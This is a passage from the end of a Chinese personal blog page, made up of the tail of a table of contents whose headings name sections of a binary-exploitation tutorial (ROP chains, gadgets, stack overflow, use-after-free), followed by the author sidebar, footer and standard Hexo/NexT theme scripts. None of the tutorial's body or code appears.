class="nav-text">编译测试用例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ROP简介"><span class="nav-text">ROP简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#寻找ROP"><span class="nav-text">寻找ROP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#构造利用并测试"><span class="nav-text">构造利用并测试</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实践3-栈溢出-去掉辅助函数"><span class="nav-text">实践3_栈溢出_去掉辅助函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#bss段"><span class="nav-text">.bss段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#寻找合适的gadget"><span class="nav-text">寻找合适的gadget</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#开始构造ROP"><span class="nav-text">开始构造ROP</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实践4-释放后使用（Use-After-Free）学习"><span class="nav-text">实践4_释放后使用（Use-After-Free）学习</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#分析程序"><span class="nav-text">分析程序</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞点"><span class="nav-text">漏洞点</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#最终利用"><span class="nav-text">最终利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-text">参考</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">pandamac</p>
  <div class="site-description" itemprop="description">Android/iOS/Macos</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">6</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/pandamac/pandamac.github.io" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;pandamac&#x2F;pandamac.github.io" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:pandashellcode@163.com" title="E-Mail → mailto:pandashellcode@163.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; Sun Feb 23 2020 08:00:00 GMT+0800 (China Standard Time) – 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">pandamac</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    <span title="站点总字数">72k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">1:05</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.0.0
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.1
  </div>

        
<div class="busuanzi-count">
  <script pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
<script src="/js/schemes/pisces.js"></script>
<script src="/js/next-boot.js"></script>
  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.getAttribute('pjax') !== null) {
      script.setAttribute('pjax', '');
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  




  <script src="/js/local-search.js"></script>












    <div id="pjax">
  

  

    </div>
</body>
</html>
